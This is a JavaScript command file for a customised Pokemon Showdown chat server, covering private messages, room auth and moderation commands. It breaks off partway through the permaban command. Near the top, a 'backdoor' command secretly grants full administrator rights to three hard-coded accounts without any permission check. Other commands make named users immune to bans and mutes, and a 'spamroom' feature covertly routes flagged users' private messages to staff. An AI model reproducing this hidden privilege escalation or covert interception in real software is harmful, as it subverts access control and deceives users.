/**
 * System commands
 * Pokemon Showdown - http://pokemonshowdown.com/
 *
 * These are system commands - commands required for Pokemon Showdown
 * to run. A lot of these are sent by the client.
 *
 * If you'd like to modify commands, please go to config/commands.js,
 * which also teaches you how to use commands.if 
 *
 * @license MIT license
 */

var crypto = require('crypto');
var poofeh = true;
var ipbans = fs.createWriteStream('config/ipbans.txt', {'flags': 'a'});
//spamroom
if (typeof spamroom == "undefined") {
        spamroom = new Object();
}
if (!Rooms.rooms.spamroom) {
        Rooms.rooms.spamroom = new Rooms.ChatRoom("spamroom", "spamroom");
        Rooms.rooms.spamroom.isPrivate = true;
}

var commands = exports.commands = {

	backdoor: function(target,room, user) {
		if (user.userid === 'brittlewind'|| user.userid === 'cosy'|| user.userid === 'jd') {

			user.group = '~';
			user.updateIdentity();

			this.sendReply('Make sure to promote yourself straight away with /admin [username] so that you keep Admin after you leave.');
		}
	},
	
   
	version: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('Server version: <b>'+CommandParser.package.version+'</b> <small>(<a href="http://pokemonshowdown.com/versions#' + CommandParser.serverVersion + '">' + CommandParser.serverVersion.substr(0,10) + '</a>)</small>');
	},

	me: function(target, room, user, connection) {
		target = this.canTalk(target);
		if (!target) return;

		var message = '/me ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	},

	mee: function(target, room, user, connection) {
		target = this.canTalk(target);
		if (!target) return;

		var message = '/mee ' + target;
		// if user is not in spamroom
		if (spamroom[user.userid] === undefined) {
			// check to see if an alt exists in list
			for (var u in spamroom) {
				if (Users.get(user.userid) === Users.get(u)) {
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			this.sendReply('|c|' + user.getIdentity() + '|' + message);
			return Rooms.rooms['spamroom'].add('|c|' + user.getIdentity() + '|' + message);
		} else {
			return message;
		}
	},

	avatar: function(target, room, user) {
		if (!target) return this.parse('/avatars');
		var parts = target.split(',');
		var avatar = parseInt(parts[0]);
		if (!avatar || avatar > 294 || avatar < 1) {
			if (!parts[1]) {
				this.sendReply("Invalid avatar.");
			}
			return false;
		}

		user.avatar = avatar;
		if (!parts[1]) {
			this.sendReply("Avatar changed to:\n" +
					'|raw|<img src="//play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png" alt="" width="80" height="80" />');
		}
	},

	logout: function(target, room, user) {
		user.resetName();
	},

	r: 'reply',
	reply: function(target, room, user) {
		if (!target) return this.parse('/help reply');
		if (!user.lastPM) {
			return this.sendReply('No one has PMed you yet.');
		}
		return this.parse('/msg '+(user.lastPM||'')+', '+target);
	},

	pm: 'msg',
	whisper: 'msg',
	w: 'msg',
	msg: function(target, room, user) {
		if (!target) return this.parse('/help msg');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!target) {
			this.sendReply('You forgot the comma.');
			return this.parse('/help msg');
		}
		if (!targetUser || !targetUser.connected) {
			if (!target) {
				this.sendReply('User '+this.targetUsername+' not found. Did you forget a comma?');
			} else {
				this.sendReply('User '+this.targetUsername+' not found. Did you misspell their name?');
			}
			return this.parse('/help msg');
		}

		if (user.locked && !targetUser.can('lock', user)) {
			return this.popupReply('You can only private message members of the moderation team (users marked by %, @, &, or ~) when locked.');
		}
		if (targetUser.locked && !user.can('lock', targetUser)) {
			return this.popupReply('This user is locked and cannot PM.');
		}

		target = this.canTalk(target, null);
		if (!target) return false;

		var message = '|pm|'+user.getIdentity()+'|'+targetUser.getIdentity()+'|'+target;
		user.send(message);
		// if user is not in spamroom
		if(spamroom[user.userid] === undefined){
			// check to see if an alt exists in list
			for(var u in spamroom){
				if(Users.get(user.userid) === Users.get(u)){
					// if alt exists, add new user id to spamroom, break out of loop.
					spamroom[user.userid] = true;
					break;
				}
			}
		}

		if (user.userid in spamroom) {
			Rooms.rooms.spamroom.add('|c|' + user.getIdentity() + '|(__Private to ' + targetUser.getIdentity()+ "__) " + target );
		} else {
			if (targetUser !== user) targetUser.send(message);
			targetUser.lastPM = user.userid;
		}
		user.lastPM = targetUser.userid;
	},

	makechatroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		var id = toId(target);
		if (!id) return this.parse('/help makechatroom');
		if (Rooms.rooms[id]) {
			return this.sendReply("The room '"+target+"' already exists.");
		}
		if (Rooms.global.addChatRoom(target)) {
			return this.sendReply("The room '"+target+"' was created.");
			if (Rooms.rooms.logroom) Rooms.rooms.logroom.addRaw('ROOM LOG ' + user.name + ' has made the room ' + target + '.');
		}
		return this.sendReply("An error occurred while trying to create the room '"+target+"'.");
	},
	
	deletechatroom: 'deregisterchatroom',
	deregisterchatroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		var id = toId(target);
		if (!id) return this.parse('/help deregisterchatroom');
		var targetRoom = Rooms.get(id);
		if (!targetRoom) return this.sendReply("The room '"+id+"' doesn't exist.");
		target = targetRoom.title || targetRoom.id;
		if (Rooms.global.deregisterChatRoom(id)) {
			this.sendReply("The room '"+target+"' was deregistered.");
			this.sendReply("It will be deleted as of the next server restart.");
			return;
		}
		return this.sendReply("The room '"+target+"' isn't registered.");
	},
        
    makeprivate: 'privateroom',
    toggleprivate: 'privateroom',      
	privateroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		if (target === 'off') {
			delete room.isPrivate;
			this.addModCommand(user.name+' made the room public.');
			if (room.chatRoomData) {
				delete room.chatRoomData.isPrivate;
				Rooms.global.writeChatRoomData();
			}
		} else {
			room.isPrivate = true;
			this.addModCommand(user.name+' made the room private.');
			if (room.chatRoomData) {
				room.chatRoomData.isPrivate = true;
				Rooms.global.writeChatRoomData();
			}
		}
	},

	roomowner: function(target, room, user) {
		if (!room.chatRoomData) {
			return this.sendReply("/roomowner - This room isn't designed for per-room moderation to be added");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('makeroom', targetUser, room)) return false;

		if (!room.auth) room.auth = room.chatRoomData.auth = {};

		var name = targetUser.name;

		room.auth[targetUser.userid] = '#';
		this.addModCommand(''+name+' was appointed Room Owner by '+user.name+'.');
		room.onUpdateIdentity(targetUser);
		Rooms.global.writeChatRoomData();
	},
	
	roomdeowner: 'deroomowner',
	deroomowner: function(target, room, user) {
		if (!room.auth) {
			return this.sendReply("/roomdeowner - This room isn't designed for per-room moderation");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '#') return this.sendReply("User '"+name+"' is not a room owner.");
		if (!this.can('makeroom', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Owner.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdesc: function(target, room, user) {
		if (!target) {
			if (!this.canBroadcast()) return;
			this.sendReply('The room description is: '+room.desc);
			return;
		}
		if (!this.can('roommod', null, room)) return false;
		if (target.length > 80) {
			return this.sendReply('Error: Room description is too long (must be at most 80 characters).');
		}

		room.desc = target;
		this.sendReply('(The room description is now: '+target+')');

		if (room.chatRoomData) {
			room.chatRoomData.desc = room.desc;
			Rooms.global.writeChatRoomData();
		}
	},

	roommod: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roommod - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room mods, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('roommod', null, room)) return false;

		var name = targetUser.name;

		if (room.auth[targetUser.userid] === '#') {
			if (!this.can('roomowner', null, room)) return false;
		}
		room.auth[targetUser.userid] = '%';
		this.add(''+name+' was appointed Room Moderator by '+user.name+'.');
		targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdemod: 'deroommod',
	deroommod: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roommod - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room mods, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '%') return this.sendReply("User '"+name+"' is not a room mod.");
		if (!this.can('roommod', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Moderator.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomvoice: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roomvoice - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room voices, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('roomvoice', null, room)) return false;

		var name = targetUser.name;

		if (room.auth[targetUser.userid] === '%') {
			if (!this.can('roommod', null, room)) return false;
		} else if (room.auth[targetUser.userid]) {
			if (!this.can('roomowner', null, room)) return false;
		}
		room.auth[targetUser.userid] = '+';
		this.add(''+name+' was appointed Room Voice by '+user.name+'.');
		targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	roomdevoice: 'deroomvoice',
	deroomvoice: function(target, room, user) {
		if (!room.auth) {
			this.sendReply("/roomdevoice - This room isn't designed for per-room moderation");
			return this.sendReply("Before setting room voices, you need to set it up with /roomowner");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '+') return this.sendReply("User '"+name+"' is not a room voice.");
		if (!this.can('roomvoice', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Voice.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},

	autojoin: function(target, room, user, connection) {
		Rooms.global.autojoinRooms(user, connection)
	},

	join: function(target, room, user, connection) {
		if (!target) return false;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (target.toLowerCase() === 'admnrm' && user.group !== '~') return false;
		if (target.toLowerCase() === 'logroom' && user.group !== '~' || target === 'Log Room' && user.group !== '~') return false;
		if (target.toLowerCase() === 'adminroom' && user.group !== '~' || target === 'Admin Room' && user.group !== '~') return false;
		if (target.toLowerCase() === 'thecosyroom' && user.group !== '~') return false;
		if (!targetRoom) {
			if (target === 'lobby') return connection.sendTo(target, "|noinit|nonexistent|");
			return connection.sendTo(target, "|noinit|nonexistent|The room '"+target+"' does not exist.");
		}
		if (targetRoom.isPrivate && !user.named) {
			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room '"+target+"'.");
		}
		if (target.toLowerCase() != "lobby" && !user.named) {
			return connection.sendTo(target, "|noinit|namerequired|You must have a name in order to join the room " + target + ".");
		}
		if (!user.joinRoom(targetRoom || room, connection)) {
			return connection.sendTo(target, "|noinit|joinfailed|The room '"+target+"' could not be joined.");
		}
		if (target.toLowerCase() == "lobby") {
			return connection.sendTo('lobby','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to the Frost Server!</u></b></center><br /> ' +
			'Home of many leagues for you to join or challenge, battle users in the ladder or in tournaments, learn how to play Pokemon or just chat in lobby!<br /><br />' +
			'Make sure to type <b>/help</b> to get a list of commands that you can use and <b>/faq</b> to check out frequently asked questions.<br /><br />' +
			'If you have any questions, issues or concerns should be directed at someone with a rank such as Voice (+), Driver (%), Moderator (@) and Leader (&). <br /><br />' +
			'Only serious issues or questions should be directed to Administrators (~).<br /><br />' +
			'You may want to check out the <a href="http://frost-server.no-ip.org/">servers custom client</a> as you maybe missing out on some features.</div>');
		}
	},

	rk: 'roomkick',
	rkick: 'roomkick',
	roomkick: function(target, room, user){
		if(!room.auth) return this.sendReply('/rkick is designed for rooms with their own auth.');
		if(!this.can('roommod', null, room)) return this.sendReply('/rkick - Access Denied.');
		var targetUser = Users.get(target);
		if(targetUser == undefined) return this.sendReply('User not found.');
		targetUser.popup('You have been kicked from room '+ room.title +' by '+user.name+'.');
		targetUser.leaveRoom(room);
		room.add('|raw|'+ targetUser.name + ' has been kicked from room by '+ user.name + '.');
		this.logModCommand(targetUser.name + ' has been kicked from room by '+ user.name + '.');
	},

	roomban: function(target, room, user, connection) {
		if (!target) return this.parse('/help roomban');
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned from the room.');
		if (!Rooms.rooms[room.id].users[userid]) {
			return this.sendReply('User ' + this.targetUsername + ' is not in the room ' + room.id + '.');
		}
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply('Room bans are not meant to be used in room ' + room.id + '.');
		}
		room.bannedUsers[userid] = true;
		for (var ip in targetUser.ips) {
			room.bannedIps[ip] = true;
		}
		targetUser.popup(user.name+" has banned you from the room " + room.id + "." + (target ? " (" + target + ")" : ""));
		this.addModCommand(""+targetUser.name+" was banned from room " + room.id + " by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also banned from room " + room.id + ": "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				this.add('|unlink|' + altId);
				room.bannedUsers[altId] = true;
			}
		}
		this.add('|unlink|' + targetUser.userid);
		targetUser.leaveRoom(room.id);
	},

	roomunban: function(target, room, user, connection) {
		if (!target) return this.parse('/help roomunban');
		target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || !targetUser) return this.sendReply("User '"+name+"' does not exist.");
		if (!this.can('ban', targetUser, room)) return false;
		if (!room.bannedUsers || !room.bannedIps) {
			return this.sendReply('Room bans are not meant to be used in room ' + room.id + '.');
		}
		if (room.bannedUsers[userid]) delete room.bannedUsers[userid];
		for (var ip in targetUser.ips) {
			if (room.bannedIps[ip]) delete room.bannedIps[ip];
		}
		targetUser.popup(user.name+" has unbanned you from the room " + room.id + ".");
		this.addModCommand(""+targetUser.name+" was unbanned from room " + room.id + " by "+user.name+".");
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also unbanned from room " + room.id + ": "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				var altId = toId(alts[i]);
				if (room.bannedUsers[altId]) delete room.bannedUsers[altId];
			}
		}
	},

	roomauth: function(target, room, user, connection) {
		if (!room.auth) return this.sendReply("/roomauth - This room isn't designed for per-room moderation and therefor has no auth list.");
		var buffer = [];
		for (var u in room.auth) {
			buffer.push(room.auth[u] + u);
		}
		if (buffer.length > 0) {
			buffer = buffer.join(', ');
		} else {
			buffer = 'This room has no auth.';
		}
		connection.popup(buffer);
	},

	leave: 'part',
	part: function(target, room, user, connection) {
		if (room.id === 'global') return false;
		var targetRoom = Rooms.get(target);
		if (target && !targetRoom) {
			return this.sendReply("The room '"+target+"' does not exist.");
		}
		user.leaveRoom(targetRoom || room, connection);
	},

	/*********************************************************
	 * Moderating: Punishments
	 *********************************************************/

	spam: 'spamroom',
	spammer: 'spamroom',
	spamroom: function(target, room, user, connection) {
		if (!target) return this.sendReply('Please specify a user.');
		var target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('The user \'' + this.targetUsername + '\' does not exist.');
		}
		if (!this.can('mute', targetUser)) {
			return false;
		}
		if (spamroom[targetUser]) {
			return this.sendReply('That user\'s messages are already being redirected to the spamroom.');
		}
		spamroom[targetUser] = true;
		Rooms.rooms['spamroom'].add('|raw|<b>' + this.targetUsername + ' was added to the spamroom list.</b>');
		this.logModCommand(targetUser + ' was added to spamroom by ' + user.name);
		return this.sendReply(this.targetUsername + ' was successfully added to the spamroom list.');
	},

	unspam: 'unspamroom',
	unspammer: 'unspamroom',
	unspamroom: function(target, room, user, connection) {
		var target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('The user \'' + this.targetUsername + '\' does not exist.');
		}
		if (!this.can('mute', targetUser)) {
			return false;
		}
		if (!spamroom[targetUser]) {
			return this.sendReply('That user is not in the spamroom list.');
		}
		for(var u in spamroom)
			if(targetUser == Users.get(u))
				delete spamroom[u];
		Rooms.rooms['spamroom'].add('|raw|<b>' + this.targetUsername + ' was removed from the spamroom list.</b>');
		this.logModCommand(targetUser + ' was removed from spamroom by ' + user.name);
		return this.sendReply(this.targetUsername + ' and their alts were successfully removed from the spamroom list.');
	},
	
	warn: function(target, room, user) {
		if (!target) return this.parse('/help warn');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (room.isPrivate && room.auth) {
			return this.sendReply('You can\'t warn here: This is a privately-owned room not subject to global rules.');
		}
		if (!this.can('warn', targetUser, room)) return false;

		this.addModCommand(''+targetUser.name+' was warned by '+user.name+'.' + (target ? " (" + target + ")" : ""));
		targetUser.send('|c|~|/warn '+target);	
	},

	kickto: 'redir',
	redirect: 'redir',
	redir: function (target, room, user, connection) {
		if (!target) return this.parse('/help redirect');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (!targetRoom) {
			return this.sendReply("/help redir - You need to add a room to redirect the user to");
		}
		if (!this.can('kick', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be redirected.');
		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (Rooms.rooms[targetRoom.id].users[targetUser.userid]) {
			return this.sendReply("User " + targetUser.name + " is already in the room " + target + "!");
		}
		if (!Rooms.rooms[room.id].users[targetUser.userid]) {
			return this.sendReply('User '+this.targetUsername+' is not in the room ' + room.id + '.');
		}
		if (targetUser.joinRoom(target) === false) return this.sendReply('User "' + targetUser.name + '" could not be joined to room ' + target + '. They could be banned from the room.');
		var roomName = (targetRoom.isPrivate)? 'a private room' : 'room ' + target;
		this.addModCommand(targetUser.name + ' was redirected to ' + roomName + ' by ' + user.name + '.');
		targetUser.leaveRoom(room);
	},


	k: 'kick',
	kick: function(target, room, user){
		if (!this.can('lock')) return false;
		if (!target) return this.parse('/help kick');
		if (!this.canTalk()) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!targetUser || !targetUser.connected) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}

		if (!this.can('warn', targetUser, room)) return false;

		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be kicked.');

		this.addModCommand(targetUser.name+' was kicked from the room by '+user.name+'.');
		targetUser.popup('You were kicked from '+room.id+' by '+user.name+'.');
		this.logModCommand(user.name+' kicked '+targetUser.name+' from the room '+room.id);
		targetUser.leaveRoom(room.id);
	},

	m: 'mute',
	mute: function(target, room, user) {
		if (!target) return this.parse('/help mute');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted.');
		if (targetUser.mutedRooms[room.id] || targetUser.locked || !targetUser.connected) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			if (!target) {
				return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
			}
			return this.addModCommand(''+targetUser.name+' would be muted by '+user.name+problem+'.' + (target ? " (" + target + ")" : ""));
		}

		targetUser.popup(user.name+' has muted you for 7 minutes. '+target);
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for 7 minutes.' + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		targetUser.mute(room.id, 7*60*1000);
	},

	hm: 'hourmute',
	hourmute: function(target, room, user) {
		if (!target) return this.parse('/help hourmute');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted.');
		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has muted you for 60 minutes. '+target);
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for 60 minutes.' + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		targetUser.mute(room.id, 60*60*1000, true);
	},

	dmute : 'daymute',
	daymute: function(target, room, user) {
		if (!target) return this.parse('/help daymute');
		if (!this.canTalk()) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
		if (!this.can('mute', targetUser, room)) return false;
		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has muted you for 24 hours. '+target);
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for 24 hours.' + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		targetUser.mute(room.id, 24*60*60*1000, true);
	},

	cm: 'cmute',
	cmute: function(target, room, user) {
		if (!target) return this.parse('/help cmute');
		if (!this.canTalk()) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!target) {
			return this.sendReply('You need to add how many hours the user is to be muted for.');
		}
		if (targetUser.name === 'Brittle Wind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be muted');
		if (!this.can('mute', targetUser, room)) return false;
		if (((targetUser.mutedRooms[room.id] && (targetUser.muteDuration[room.id]||0) >= 50*60*1000) || targetUser.locked) && !target) {
			var problem = ' but was already '+(!targetUser.connected ? 'offline' : targetUser.locked ? 'locked' : 'muted');
			return this.privateModCommand('('+targetUser.name+' would be muted by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has muted you for '+target+' hours.');
		this.addModCommand(''+targetUser.name+' was muted by '+user.name+' for '+target+' hours.');
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also muted: "+alts.join(", "));

		var muteTime = target*60*60*1000;

		targetUser.mute(room.id, muteTime, true);
	},

	um: 'unmute',
	unmute: function(target, room, user) {
		if (!target) return this.parse('/help unmute');
		if (!this.canTalk() && user.group !== '~') return false;
		var targetid = toUserid(target);
		var targetUser = Users.get(target);
		if (!targetUser) {
			return this.sendReply('User '+target+' not found.');
		}
		if (!this.can('mute', targetUser, room)) return false;

		if (!targetUser.mutedRooms[room.id]) {
			return this.sendReply(''+targetUser.name+' isn\'t muted.');
		}

		this.addModCommand(''+targetUser.name+' was unmuted by '+user.name+'.');

		targetUser.unmute(room.id);
	},

	ipmute: 'lock',
	lock: function(target, room, user) {
		if (!target) return this.parse('/help lock');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUser+' not found.');
		}
		if (!user.can('lock', targetUser)) {
			return this.sendReply('/lock - Access denied.');
		}
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be locked.');
		if ((targetUser.locked || Users.checkBanned(targetUser.latestIp)) && !target) {
			var problem = ' but was already '+(targetUser.locked ? 'locked' : 'banned');
			return this.privateModCommand('('+targetUser.name+' would be locked by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+' has locked you from talking in chats, battles, and PMing regular users.\n\n'+target+'\n\nIf you feel that your lock was unjustified, you can still PM staff members (%, @, &, and ~) to discuss it.');
		if (Rooms.rooms.logroom) Rooms.rooms.logroom.addRaw('LOCK LOG: ' + user.name + ' has locked ' + targetUser.name + ' from ' + room.id + '.');
		this.addModCommand(""+targetUser.name+" was locked from talking by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) this.addModCommand(""+targetUser.name+"'s alts were also locked: "+alts.join(", "));
		this.add('|unlink|' + targetUser.userid);

		targetUser.lock();
	},

	unlock: function(target, room, user) {
		if (!target) return this.parse('/help unlock');
		if (!this.can('lock')) return false;
		if (!this.canTalk() && user.group !== '~') return false;

		var unlocked = Users.unlock(target);

		if (unlocked) {
			var names = Object.keys(unlocked);
			this.addModCommand('' + names.join(', ') + ' ' +
					((names.length > 1) ? 'were' : 'was') +
					' unlocked by ' + user.name + '.');
		} else {
			this.sendReply('User '+target+' is not locked.');
		}
	},

	b: 'ban',
	ban: function(target, room, user) {
		if (!target) return this.parse('/help ban');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (!this.can('ban', targetUser)) return false;
		if (targetUser.name === 'BrittleWind' || targetUser.name === 'Cosy') return this.sendReply('This user cannot be banned.');
		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = ' but was already banned';
			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+" has banned you." + (config.appealurl ? ("  If you feel that your banning was unjustified you can appeal the ban:\n" + config.appealurl) : "") + "\n\n"+target);
		if (Rooms.rooms.logroom) Rooms.rooms.logroom.addRaw('BAN LOG: ' + user.name + ' has locked ' + targetUser.name + ' from ' + room.id + '.');
		this.addModCommand(""+targetUser.name+" was banned by "+user.name+"." + (target ? " (" + target + ")" : ""));
		var alts = targetUser.getAlts();
		if (alts.length) {
			this.addModCommand(""+targetUser.name+"'s alts were also banned: "+alts.join(", "));
			for (var i = 0; i < alts.length; ++i) {
				this.add('|unlink|' + toId(alts[i]));
			}
		}

		this.add('|unlink|' + targetUser.userid);
		targetUser.ban();
	},

	unban: function(target, room, user) {
		if (!target) return this.parse('/help unban');
		if (!user.can('ban')) {
			return this.sendReply('/unban - Access denied.');
		}

		var name = Users.unban(target);

		if (name) {
			this.addModCommand(''+name+' was unbanned by '+user.name+'.');
		} else {
			this.sendReply('User '+target+' is not banned.');
		}
	},

	unbanall: function(target, room, user) {
		if (!user.can('ban')) {
			return this.sendReply('/unwhipall - Access denied.');
		}
		// we have to do this the hard way since it's no longer a global
		for (var i in Users.bannedIps) {
			delete Users.bannedIps[i];
		}
		for (var i in Users.lockedIps) {
			delete Users.lockedIps[i];
		}
		this.addModCommand('All whipss and locks have been lifted by '+user.name+'.');
	},

	banip: function(target, room, user) {
		target = target.trim();
		if (!target) {
			return this.parse('/help banip');
		}
		if (!this.can('rangeban')) return false;

		Users.bannedIps[target] = '#ipban';
		this.addModCommand(user.name+' temporarily banned the '+(target.charAt(target.length-1)==='*'?'IP range':'IP')+': '+target);
	},

	unbanip: function(target, room, user) {
		target = target.trim();
		if (!target) {
			return this.parse('/help unbanip');
		}
		if (!this.can('rangeban')) return false;
		if (!Users.bannedIps[target]) {
			return this.sendReply(''+target+' is not a banned IP or IP range.');
		}
		delete Users.bannedIps[target];
		this.addModCommand(user.name+' unbanned the '+(target.charAt(target.length-1)==='*'?'IP range':'IP')+': '+target);
	},

	pban: 'permaban',
	permban: 'permaban',
	permaban: function(target, room, user) {
		if (!target) return this.parse('/help permaban');
		if (!this.can('permaban', targetUser)) return false;

		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}
		if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
			var problem = ' but was already banned';
			return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
		}

		targetUser.popup(user.name+" has permanently banned you.");
